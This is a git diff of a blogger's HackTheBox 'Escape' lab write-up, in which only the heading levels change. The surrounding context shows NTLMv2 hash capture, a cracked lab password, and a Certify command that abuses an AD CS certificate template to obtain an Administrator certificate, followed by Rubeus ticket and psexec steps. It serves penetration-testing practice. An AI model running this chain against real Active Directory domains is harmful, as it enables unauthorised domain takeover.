@@ -1,10 +1,12 @@
+# Escape
+
 Hello, it's qurius! Welcome to my first blog post ever. Today we are taking a look at the `Escape` machine from [HackTheBox](https://www.hackthebox.com/). It was a medium difficulty machine which involved stealing of NTLM hashes and abusing AD CS certificate templates. This one was on the easier side of medium machines spectrum in my opinion (if you're familiar with Active Directory exploitation). Nonetheless, it was fun and I really enjoyed it, let's take a look.
 
 First let's start with the nmap.
 
-# Reconnaissance & Enumeration
+## Reconnaissance & Enumeration
 
-## Nmap
+### Nmap
 
 As with every machine, let's start with a Nmap scan. I use my own Rust wrapper which you can find [here](https://github.com/frostvandrer/rustmap). It was my first Rust project and it's very simple and not optimized, but it gets the job done. Let's look at the results.
 
@@ -99,7 +101,7 @@ We are dealing with a Windows 10 machine. Since we can see port 88 open as well 
 printf "%s\t%s\n\n" "10.10.11.202" "sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
 ```
 
-## LDAP
+### LDAP
 
 Let's start with LDAP. We can try lo login without any credentials, sometimes you're lucky and it works. Unfortunatelly, in this case it does not work and we need credentials.
 
@@ -122,7 +124,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 # numResponses: 1
 ```
 
-## SMB
+### SMB
 
 Since there is no web server running on the box we can proceed with enumerating `SMB`. We can user `crackmapexec` to look at the shares.
 
@@ -232,7 +234,7 @@ SQL>
 
 There were just 4 databases and none of them contained any useful information. Most of it was just blank. We can try to use those credentials against `SMB` or `WINRM`, but everything fails. 
 
-# Capturing NTLMv2 hash
+## Capturing NTLMv2 hash
 
 What we can do now is to try to steal a `NTLMv2` hash. Since we can execute SQL commands on the DC, we could try to fetch a remote resource and force the database to use `NTLMv2` authentication so we can capture the hash.
 
@@ -285,7 +287,7 @@ HTTP        sequel.htb      5985   DC               [*] http://sequel.htb:5985/w
 WINRM       sequel.htb      5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
 ```
 
-# Shell as sql_svc
+## Shell as sql_svc
 
 We confirme that we indeed can log in via `WINRM` as user `sql_svc`. Let's use `evil-winrm` to get a shell.
 
@@ -411,9 +413,9 @@ Info: Establishing connection to remote endpoint
 
 We indeed can and now we can finally read the `user.txt` flag.
 
-# Privilege escalation - Shell as Ryan.Cooper
+## Privilege escalation - Shell as Ryan.Cooper
 
-## Post-Exploitation Enumeration
+### Post-Exploitation Enumeration
 
 Enumerating the filesystem did not show anything interesting straight away so I decided to upload and run `WinPEAS`.
 
@@ -479,7 +481,7 @@ Info: Upload successful!
 
 `WinPEAS` told us that the domain uses certificates for authentication. This is very interesing. We can use tools like [Certify](https://github.com/GhostPack/Certify) to enumerate the certificates.
 
-## Enumerating certificates with Certify
+### Enumerating certificates with Certify
 
 We can dowload [Certify](https://github.com/GhostPack/Certify) to our Windows VM and compile it from source, then upload it to the target machine.
 
@@ -542,11 +544,11 @@ There are 2 main problems:
 1. `msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT` - This ensures that the user that requests the certificate based on this template can supply name of the object the certificate is for. This means that the user can request a certificate for another user e.g. administrator (we'll do this later)
 2. `Enrollment Rights: sequel\Domain Users` - This means that any domain user can request a certificate based on this template.
 
-## Abusing AD CS certificate template with Certify & Rubeus
+### Abusing AD CS certificate template with Certify & Rubeus
 
 What we can do is request a certificate for the `Administrator` user which we can later use the get a TGT and use it to log into the box. Since we have everything we need. We can use Certify and Rubeus, to perform the attack. We can do it in 5 steps.
 
-### Step 1 - Request the Administrator certificate
+#### Step 1 - Request the Administrator certificate
 
 ```powershell
 .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
@@ -595,7 +597,7 @@ rP7taJH3rMwPFgSiXOPOk4rRroLNEtT3H1YgAQIDAQABAoIBAHrZ+nKncuhDm4yb
 .
 ```
 
-### Step 2 - Transform the certificate from PEM to PFX format
+#### Step 2 - Transform the certificate from PEM to PFX format
 
 We can copy the certificate that Certify has provided us with and transform it to `.pfx` format using `openssl`.
 
@@ -603,7 +605,7 @@ We can copy the certificate that Certify has provided us with and transform it t
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-### Step 3 - Request Administrator TGT
+#### Step 3 - Request Administrator TGT
 
 We now have a certificate to authenticate as `Administrator`. What we can do now, is to issue ourselves a `Ticket Granting Ticket` (TGT). We can do this with [Rubeus](https://github.com/GhostPack/Rubeus). We again download and compile from source in our Windows VM and upload it to the box.
 
@@ -688,7 +690,7 @@ Info: Upload successful!
 
 Success! We now have a TGT as `Administrator`. This is of course in `kirbi` format (and base64 encoded) so if we want to use it from our Kali machine, we have to convert it to `ccache`. We can use Impacket [ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) to do so.
 
-### Step 4 - Transform the Ticket From KIRBI to CCACHE format
+#### Step 4 - Transform the Ticket From KIRBI to CCACHE format
 
 ```bash
 ➜  Escape cat ticket.kirbi.b64 | base64 -d > ticket.kirbi
@@ -700,7 +702,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 ➜  Escape
 ```
 
-### Step 5 Run psexec
+#### Step 5 Run psexec
 
 Looks like we have everything we need. Let's use Impacket `psexec.py` to get a shell as `Administrator`.
 
@@ -741,6 +743,6 @@ e2524c**************************
 C:\Windows\system32>
 ```
 
-# Final thoughts
+## Final thoughts
 
 This was a very fun box. I always like when there are Windows machines on HackTheBox, because, frankly, they are always a bit our of my comfort zone. I really hope you liked my writeup for this machine and I'll see you in the next one. Thanks!
